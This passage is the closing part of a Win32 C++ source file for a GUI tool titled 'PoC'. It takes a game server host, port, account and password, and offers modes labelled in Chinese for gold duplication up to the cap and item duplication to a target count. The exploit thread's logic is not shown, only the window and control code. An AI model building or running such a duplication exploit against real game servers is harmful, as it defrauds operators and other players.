    PostMessageW(g_hwnd, WM_EXP_FINISHED, 0, 0);
    return 0;
}

// ---------------------------------------------------------------------------
// 界面
// ---------------------------------------------------------------------------
long GetEditInt(HWND edit, long defValue) {
    wchar_t buf[64] = {0};
    GetWindowTextW(edit, buf, 63);
    wchar_t* end = nullptr;
    long v = wcstol(buf, &end, 0);  // base 0:支持 0x 前缀
    return (end && end != buf) ? v : defValue;
}

std::wstring GetEditText(HWND edit) {
    wchar_t buf[256] = {0};
    GetWindowTextW(edit, buf, 255);
    return buf;
}

void CreateControls(HWND hwnd) {
    HFONT font = static_cast<HFONT>(GetStockObject(DEFAULT_GUI_FONT));
    auto label = [&](int x, int y, int w, const wchar_t* text) {
        HWND h = CreateWindowExW(0, L"STATIC", text, WS_CHILD | WS_VISIBLE,
                                 x, y, w, 18, hwnd, nullptr, g_hinst, nullptr);
        SendMessageW(h, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);
    };
    auto edit = [&](int x, int y, int w, const wchar_t* def, int id) {
        HWND h = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", def,
                                 WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
                                 x, y, w, 22, hwnd, reinterpret_cast<HMENU>(id),
                                 g_hinst, nullptr);
        SendMessageW(h, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);
        return h;
    };

    label(10, 15, 45, L"HOST:");
    g_edHost = edit(60, 12, 130, L"127.0.0.1", IDC_HOST);
    label(200, 15, 45, L"端口:");
    g_edPort = edit(245, 12, 60, L"10011", IDC_PORT);

    label(320, 15, 40, L"账号:");
    g_edMid = edit(360, 12, 100, L"", IDC_MID);
    label(470, 15, 40, L"密码:");
    g_edPwd = edit(510, 12, 220, L"", IDC_PWD);

    HWND rGold = CreateWindowExW(0, L"BUTTON", L"金币复制(拉到上限)",
                                 WS_CHILD | WS_VISIBLE | BS_AUTORADIOBUTTON | WS_GROUP,
                                 10, 44, 160, 22, hwnd,
                                 reinterpret_cast<HMENU>(IDC_MODE_GOLD), g_hinst, nullptr);
    SendMessageW(rGold, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);
    HWND rItem = CreateWindowExW(0, L"BUTTON", L"物品复制",
                                 WS_CHILD | WS_VISIBLE | BS_AUTORADIOBUTTON,
                                 10, 68, 90, 22, hwnd,
                                 reinterpret_cast<HMENU>(IDC_MODE_ITEM), g_hinst, nullptr);
    SendMessageW(rItem, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);
    SendMessageW(rGold, BM_SETCHECK, BST_CHECKED, 0);

    label(180, 71, 55, L"物品ID:");
    g_edItem = edit(230, 68, 100, L"29692", IDC_ITEM);
    label(340, 71, 70, L"目标数量:");
    g_edTarget = edit(410, 68, 80, L"32767", IDC_TARGET);

    g_btnRun = CreateWindowExW(0, L"BUTTON", L"开始",
                               WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                               510, 66, 100, 26, hwnd,
                               reinterpret_cast<HMENU>(IDC_RUN), g_hinst, nullptr);
    SendMessageW(g_btnRun, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);
    g_btnStop = CreateWindowExW(0, L"BUTTON", L"停止",
                                WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_DISABLED,
                                620, 66, 100, 26, hwnd,
                                reinterpret_cast<HMENU>(IDC_STOP), g_hinst, nullptr);
    SendMessageW(g_btnStop, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);

    g_log = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
                            WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE |
                                ES_READONLY | ES_AUTOVSCROLL,
                            10, 100, 720, 340, hwnd,
                            reinterpret_cast<HMENU>(IDC_LOG), g_hinst, nullptr);
    SendMessageW(g_log, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);
}

void RunExp() {
    if (g_running) return;
    auto* p = new ExpParams{
        GetEditText(g_edHost),
        static_cast<int>(GetEditInt(g_edPort, 10011)),
        GetEditText(g_edMid),
        GetEditText(g_edPwd),
        SendMessageW(GetDlgItem(g_hwnd, IDC_MODE_GOLD), BM_GETCHECK, 0, 0) == BST_CHECKED,
        GetEditInt(g_edItem, 29692),
        GetEditInt(g_edTarget, 32767),
    };
    if (p->host.empty() || p->mid.empty() || p->pwd.empty()) {
        LogLine(L"[!] HOST / 账号 / 密码 不能为空。");
        delete p;
        return;
    }
    g_running = true;
    g_stop = false;
    EnableWindow(g_btnRun, FALSE);
    EnableWindow(g_btnStop, TRUE);
    HANDLE t = CreateThread(nullptr, 0, ExpThread, p, 0, nullptr);
    if (t) {
        CloseHandle(t);
    } else {
        g_running = false;
        EnableWindow(g_btnRun, TRUE);
        EnableWindow(g_btnStop, FALSE);
        delete p;
        LogLine(L"[!] 无法创建工作线程。");
    }
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_CREATE:
            CreateControls(hwnd);
            LogLine(L"就绪。");
            return 0;
        case WM_COMMAND:
            if (LOWORD(wp) == IDC_RUN && HIWORD(wp) == BN_CLICKED)
                RunExp();
            else if (LOWORD(wp) == IDC_STOP && HIWORD(wp) == BN_CLICKED) {
                g_stop = true;
                LogLine(L"[*] 停止请求已发送,等待当前轮结束...");
            }
            return 0;
        case WM_EXP_FINISHED:
            g_running = false;
            EnableWindow(g_btnRun, TRUE);
            EnableWindow(g_btnStop, FALSE);
            return 0;
        case WM_CLOSE:
            if (g_running) {
                g_stop = true;
                LogLine(L"[*] 正在停止,请稍候再关闭...");
                return 0;
            }
            DestroyWindow(hwnd);
            return 0;
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

}  // namespace

int APIENTRY wWinMain(HINSTANCE hinst, HINSTANCE, LPWSTR, int showCmd) {
    g_hinst = hinst;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    WNDCLASSEXW wc;
    wc.cbSize = sizeof(wc);
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hinst;
    wc.hIcon = LoadIconW(nullptr, IDI_APPLICATION);
    wc.hCursor = LoadCursorW(nullptr, IDC_ARROW);
    wc.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_WINDOW + 1);
    wc.lpszMenuName = nullptr;
    wc.lpszClassName = kClassName;
    wc.hIconSm = LoadIconW(nullptr, IDI_APPLICATION);
    if (!RegisterClassExW(&wc)) return 1;

    g_hwnd = CreateWindowExW(0, kClassName, L"PoC",
                             WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
                             CW_USEDEFAULT, CW_USEDEFAULT, 756, 504,
                             nullptr, nullptr, hinst, nullptr);
    if (!g_hwnd) return 1;

    ShowWindow(g_hwnd, showCmd);
    UpdateWindow(g_hwnd);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    WSACleanup();
    return static_cast<int>(msg.wParam);
}
